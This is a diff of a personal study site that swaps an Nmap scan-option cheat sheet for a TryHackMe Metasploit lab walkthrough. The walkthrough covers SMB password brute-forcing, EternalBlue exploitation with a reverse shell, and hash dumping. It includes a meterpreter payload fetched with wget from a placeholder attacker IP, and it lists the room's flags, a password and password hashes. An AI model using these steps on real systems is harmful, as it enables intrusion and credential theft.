@@ -11,10 +11,10 @@
       
       
       
-        <link rel="prev" href="../../../..">
+        <link rel="prev" href="../nmap/">
       
       
-        <link rel="next" href="../Metasploit/">
+        <link rel="next" href="../../../../Python/python/">
       
       
       <link rel="icon" href="../../../../assets/images/favicon.png">
@@ -22,7 +22,7 @@
     
     
       
-        <title>Nmap - HSKY WRLD</title>
+        <title>Metasploit - HSKY WRLD</title>
       
     
     
@@ -74,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#nmap-host-discovery-commands" class="md-skip">
+        <a href="#tryhackme-metasploit-walkthrough" class="md-skip">
           Skip to content
         </a>
       
@@ -109,7 +109,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Nmap
+              Metasploit
             
           </span>
         </div>
@@ -385,6 +385,27 @@
                 
   
   
+  
+  
+    <li class="md-nav__item">
+      <a href="../nmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nmap
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
     
   
   
@@ -401,7 +422,7 @@
           
   
   <span class="md-ellipsis">
-    Nmap
+    Metasploit
   </span>
   
 
@@ -412,7 +433,7 @@
         
   
   <span class="md-ellipsis">
-    Nmap
+    Metasploit
   </span>
   
 
@@ -434,18 +455,54 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#scan-types-and-example-commands" class="md-nav__link">
+  <a href="#task-1-nmap-scan" class="md-nav__link">
     <span class="md-ellipsis">
-      Scan Types and Example Commands
+      Task 1: Nmap Scan
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#nmap-options" class="md-nav__link">
+  <a href="#task-2-smb-password-exploitation" class="md-nav__link">
     <span class="md-ellipsis">
-      Nmap Options
+      Task 2: SMB Password Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-3-metasploit-database-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 3: Metasploit Database Setup
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-4-vulnerability-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 4: Vulnerability Scanning
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-5-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 5: Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-6-msfvenom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 6: Msfvenom
     </span>
   </a>
   
@@ -455,27 +512,6 @@
   
 </nav>
       
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../Metasploit/" class="md-nav__link">
-        
-  
-  <span class="md-ellipsis">
-    Metasploit
-  </span>
-  
-
-      </a>
     </li>
   
 
@@ -662,18 +698,54 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#scan-types-and-example-commands" class="md-nav__link">
+  <a href="#task-1-nmap-scan" class="md-nav__link">
     <span class="md-ellipsis">
-      Scan Types and Example Commands
+      Task 1: Nmap Scan
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#nmap-options" class="md-nav__link">
+  <a href="#task-2-smb-password-exploitation" class="md-nav__link">
     <span class="md-ellipsis">
-      Nmap Options
+      Task 2: SMB Password Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-3-metasploit-database-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 3: Metasploit Database Setup
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-4-vulnerability-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 4: Vulnerability Scanning
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-5-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 5: Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-6-msfvenom" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 6: Msfvenom
     </span>
   </a>
   
@@ -697,308 +769,103 @@
   
 
 
-<h1 id="nmap-host-discovery-commands">Nmap Host Discovery Commands</h1>
-<p>You have learned how ARP, ICMP, TCP, and UDP can detect live hosts by completing this room. Any response from a host is an indication that it is online. Below is a quick summary of the command-line options for Nmap that we have covered.</p>
-<h2 id="scan-types-and-example-commands">Scan Types and Example Commands</h2>
-<table>
-<thead>
-<tr>
-<th>Scan Type</th>
-<th>Example Command</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>ARP Scan</td>
-<td><code>sudo nmap -PR -sn MACHINE_IP/24</code></td>
-</tr>
-<tr>
-<td>ICMP Echo Scan</td>
-<td><code>sudo nmap -PE -sn MACHINE_IP/24</code></td>
-</tr>
-<tr>
-<td>ICMP Timestamp Scan</td>
-<td><code>sudo nmap -PP -sn MACHINE_IP/24</code></td>
-</tr>
-<tr>
-<td>ICMP Address Mask Scan</td>
-<td><code>sudo nmap -PM -sn MACHINE_IP/24</code></td>
-</tr>
-<tr>
-<td>TCP SYN Ping Scan</td>
-<td><code>sudo nmap -PS22,80,443 -sn MACHINE_IP/30</code></td>
-</tr>
-<tr>
-<td>TCP ACK Ping Scan</td>
-<td><code>sudo nmap -PA22,80,443 -sn MACHINE_IP/30</code></td>
-</tr>
-<tr>
-<td>UDP Ping Scan</td>
-<td><code>sudo nmap -PU53,161,162 -sn MACHINE_IP/30</code></td>
-</tr>
-</tbody>
-</table>
-<p>Remember to add <code>-sn</code> if you are only interested in host discovery without port-scanning. Omitting <code>-sn</code> will let Nmap default to port-scanning the live hosts.</p>
-<h2 id="nmap-options">Nmap Options</h2>
-<table>
-<thead>
-<tr>
-<th>Option</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>-n</td>
-<td>No DNS lookup</td>
-</tr>
-<tr>
-<td>-R</td>
-<td>Reverse-DNS lookup for all hosts</td>
-</tr>
-<tr>
-<td>-sn</td>
-<td>Host discovery only</td>
-</tr>
-</tbody>
-</table>
-<p>Ensure you have taken note of all the Nmap options explained in this room. To continue learning about Nmap, please join the room Nmap Basic Port Scans, which introduces the basic types of port scans.</p>
-<h1 id="nmap-scans-and-port-discovery-commands">Nmap Scans and Port Discovery Commands</h1>
-<h2 id="host-discovery-scans">Host Discovery Scans</h2>
-<p>You have learned how ARP, ICMP, TCP, and UDP can detect live hosts. Now, let's explore three types of port scans to discover running TCP and UDP services on a target host.</p>
-<h3 id="port-scan-types-and-example-commands">Port Scan Types and Example Commands</h3>
-<table>
-<thead>
-<tr>
-<th>Port Scan Type</th>
-<th>Example Command</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>TCP Connect Scan</td>
-<td><code>nmap -sT MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>TCP SYN Scan</td>
-<td><code>sudo nmap -sS MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>UDP Scan</td>
-<td><code>sudo nmap -sU MACHINE_IP</code></td>
-</tr>
-</tbody>
-</table>
-<p>These scan types should get you started in discovering running TCP and UDP services on a target host.</p>
-<h3 id="nmap-port-scan-options">Nmap Port Scan Options</h3>
-<table>
-<thead>
-<tr>
-<th>Option</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>-p-</td>
-<td>Scan all ports</td>
-</tr>
-<tr>
-<td>-p1-1023</td>
-<td>Scan ports 1 to 1023</td>
-</tr>
-<tr>
-<td>-F</td>
-<td>Scan the 100 most common ports</td>
-</tr>
-<tr>
-<td>-r</td>
-<td>Scan ports in consecutive order</td>
-</tr>
-<tr>
-<td>-T&lt;0-5&gt;</td>
-<td>-T0 being the slowest and T5 the fastest</td>
-</tr>
-<tr>
-<td>--max-rate 50</td>
-<td>Set the rate to &lt;= 50 packets/sec</td>
-</tr>
-<tr>
-<td>--min-rate 15</td>
-<td>Set the rate to &gt;= 15 packets/sec</td>
-</tr>
-<tr>
-<td>--min-parallelism 100</td>
-<td>Set at least 100 probes in parallel</td>
-</tr>
-</tbody>
-</table>
-<p>Ensure you understand these options for effective Nmap scanning. To continue learning about Nmap, consider joining the room "Nmap Basic Port Scans," which introduces the basic types of port scans.</p>
-<h1 id="nmap-advanced-port-scans">Nmap Advanced Port Scans</h1>
-<h2 id="port-scan-types-and-example-commands_1">Port Scan Types and Example Commands</h2>
-<table>
-<thead>
-<tr>
-<th>Port Scan Type</th>
-<th>Example Command</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>TCP Null Scan</td>
-<td><code>sudo nmap -sN MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>TCP FIN Scan</td>
-<td><code>sudo nmap -sF MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>TCP Xmas Scan</td>
-<td><code>sudo nmap -sX MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>TCP Maimon Scan</td>
-<td><code>sudo nmap -sM MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>TCP ACK Scan</td>
-<td><code>sudo nmap -sA MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>TCP Window Scan</td>
-<td><code>sudo nmap -sW MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>Custom TCP Scan</td>
-<td><code>sudo nmap --scanflags URGACKPSHRSTSYNFIN MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>Spoofed Source IP</td>
-<td><code>sudo nmap -S SPOOFED_IP MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>Spoofed MAC Address</td>
-<td><code>sudo nmap --spoof-mac SPOOFED_MAC MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>Decoy Scan</td>
-<td><code>nmap -D DECOY_IP,ME MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>Idle (Zombie) Scan</td>
-<td><code>sudo nmap -sI ZOMBIE_IP MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>Fragment IP (8 bytes)</td>
-<td><code>nmap -f MACHINE_IP</code></td>
-</tr>
-<tr>
-<td>Fragment IP (16 bytes)</td>
-<td><code>nmap -ff MACHINE_IP</code></td>
-</tr>
-</tbody>
-</table>
-<p>These scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scans provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports.</p>
-<h2 id="nmap-options_1">Nmap Options</h2>
-<table>
-<thead>
-<tr>
-<th>Option</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>--source-port PORT_NUM</td>
-<td>Specify source port number</td>
-</tr>
-<tr>
-<td>--data-length NUM</td>
-<td>Append random data to reach given length</td>
-</tr>
-<tr>
-<td>--reason</td>
-<td>Explain how Nmap made its conclusion</td>
-</tr>
-<tr>
-<td>-v</td>
-<td>Verbose</td>
-</tr>
-<tr>
-<td>-vv</td>
-<td>Very verbose</td>
-</tr>
-<tr>
-<td>-d</td>
-<td>Debugging</td>
-</tr>
-<tr>
-<td>-dd</td>
-<td>More details for debugging</td>
-</tr>
-</tbody>
-</table>
-<h2 id="nmap-post-port-scans">Nmap Post Port Scans</h2>
-<h3 id="option-meanings">Option Meanings</h3>
-<table>
-<thead>
-<tr>
-<th>Option</th>
-<th>Meaning</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>-sV</td>
-<td>Determine service/version info on open ports</td>
-</tr>
-<tr>
-<td>-sV --version-light</td>
-<td>Try the most likely probes (2)</td>
-</tr>
-<tr>
-<td>-sV --version-all</td>
-<td>Try all available probes (9)</td>
-</tr>
-<tr>
-<td>-O</td>
-<td>Detect the operating system</td>
-</tr>
-<tr>
-<td>--traceroute</td>
-<td>Run traceroute to the target</td>
-</tr>
-<tr>
-<td>--script=SCRIPTS</td>
-<td>Nmap scripts to run</td>
-</tr>
-<tr>
-<td>-sC or --script=default</td>
-<td>Run default scripts</td>
-</tr>
-<tr>
-<td>-A</td>
-<td>Equivalent to -sV -O -sC --traceroute</td>
-</tr>
-<tr>
-<td>-oN</td>
-<td>Save output in normal format</td>
-</tr>
-<tr>
-<td>-oG</td>
-<td>Save output in grepable format</td>
-</tr>
-<tr>
-<td>-oX</td>
-<td>Save output in XML format</td>
-</tr>
-<tr>
-<td>-oA</td>
-<td>Save output in normal, XML, and Grepable formats</td>
-</tr>
-</tbody>
-</table>
-<p>These options are used after conducting port scans to gather additional information, such as service/version details, operating system detection, traceroute results, and the execution of Nmap scripts for more advanced analysis.</p>
+<h1 id="tryhackme-metasploit-walkthrough">TryHackMe - Metasploit Walkthrough</h1>
+<h2 id="task-1-nmap-scan">Task 1: Nmap Scan</h2>
+<p>For this task, we started by running an Nmap scan on the target machine using the following command:</p>
+<pre><code class="language-bash">nmap -sC -sV -p- -T4 --min-rate=9326 -vv [MACHINE IP]
+</code></pre>
+<p>The options used include:</p>
+<pre><code>-sC: Run particular scripts on the target.
+-sV: Check for versions of services.
+-p-: Scan all ports.
+-T4: Set the scan speed to level 4.
+--min-rate=9326: Specify the packet sending rate.
+-vv: Enable very verbose output.
+</code></pre>
+<p>Results:</p>
+<pre><code>Question 1: How many ports are open on the target system?
+    Answer: 5
+
+Question 2: Using the relevant scanner, what NetBIOS name can you see?
+    Answer: ACME IT SUPPORT
+
+Question 3: What is running on port 8000?
+    Answer: WEBFS/1.21
+</code></pre>
+<h2 id="task-2-smb-password-exploitation">Task 2: SMB Password Exploitation</h2>
+<p>Steps:</p>
+<pre><code>Open Metasploit using msfconsole.
+Search for SMB login modules using search smb_login.
+Use the module at index 0.
+Set options including pass_file and rhosts.
+Run the exploit with run.
+</code></pre>
+<p>Results:</p>
+<pre><code>Question 4: What is the “penny” user’s SMB password?
+    Answer: leo1234
+</code></pre>
+<h2 id="task-3-metasploit-database-setup">Task 3: Metasploit Database Setup</h2>
+<p>To complete this task, follow these steps in a Linux environment:</p>
+<pre><code>Start the PostgreSQL database with systemctl start postgresql.
+Initialize the Metasploit Database with msfdb init.
+</code></pre>
+<p>Read the provided information and note potential vulnerabilities in various services.</p>
+<h2 id="task-4-vulnerability-scanning">Task 4: Vulnerability Scanning</h2>
+<p>We've learned about important commands such as search, info, and vnc_login. Now, let's answer a question:</p>
+<pre><code>Question 5: Who wrote the module that allows us to check SMTP servers for open relay?
+
+    Use the command search smtp to find the relevant module.
+
+    Get more information using info auxiliary/scanner/smtp/smtp_relay.
+
+    Answer: Campbell Murray
+</code></pre>
+<h2 id="task-5-exploitation">Task 5: Exploitation</h2>
+<p>Run another Nmap scan on the machine:</p>
+<pre><code>nmap -sC -sV -p- -T4 — min-rate=9326 -vv [MACHINE IP]
+</code></pre>
+<p>Refer to previous information about the Windows 7 Professional service. Use the following exploit:</p>
+<pre><code>Exploit: windows/smb/ms17_010_eternalblue
+Payload: generic/shell_reverse_tcp
+</code></pre>
+<p>Results:</p>
+<pre><code>Question 1: Exploit one of the critical vulnerabilities on the target VM.
+    Run the exploit as mentioned.
+
+Question 2: What is the content of the flag.txt file?
+    Find the file in Jon’s folder.
+    Answer: THM-5455554845
+
+Question 3: What is the NTLM hash of the password of the user “pirate”?
+
+    Use the command search hashdump in Metasploit.
+
+    Use the module post/windows/gather/hashdump.
+
+    Answer: 8ce9a3ebd1647fcc5e04025019f4b875
+</code></pre>
+<h2 id="task-6-msfvenom">Task 6: Msfvenom</h2>
+<p>Read the content provided in the task to answer the questions.</p>
+<pre><code>Question 1: Launch the VM attached to this task.
+    Connect via SSH: ssh murphy@[MACHINE IP]
+    Get root shell with sudo su.
+
+Question 2: Create a meterpreter payload in the .elf format.
+    Use msfvenom with the provided command.
+
+Question 3: Transfer it to the target machine.
+    Start a Python web server: python3 -m http.server 9000
+    Use wget to download: wget http://ATTACKING_MACHINE_IP:9000/shell.elf
+
+Question 4: Get a meterpreter session on the target machine.
+    Use Metasploit to set up a listener.
+
+Question 5: Use a post-exploitation module to dump hashes of other users on the system.
+    Use msfconsole and run post/linux/gather/hashdump.
+
+Question 6: What is the other user’s password hash?
+    Answer: $6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0
+</code></pre>
 
 
 
